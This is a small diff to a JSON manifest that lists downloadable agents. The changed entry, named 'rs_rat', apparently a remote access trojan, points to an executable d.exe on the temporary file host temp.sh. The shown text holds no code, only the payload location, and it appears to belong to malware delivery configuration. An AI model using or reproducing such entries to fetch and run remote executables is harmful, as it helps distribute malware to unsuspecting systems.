@@ -6,7 +6,7 @@
         "size":6942308
         }, 
        {  "agent-name":"rs_rat",
-          "url":"https://temp.sh/kugJS/d.exe",
+          "url":"https://temp.sh/kdreugJS/d.exe",
           "size":115
         }
     ]
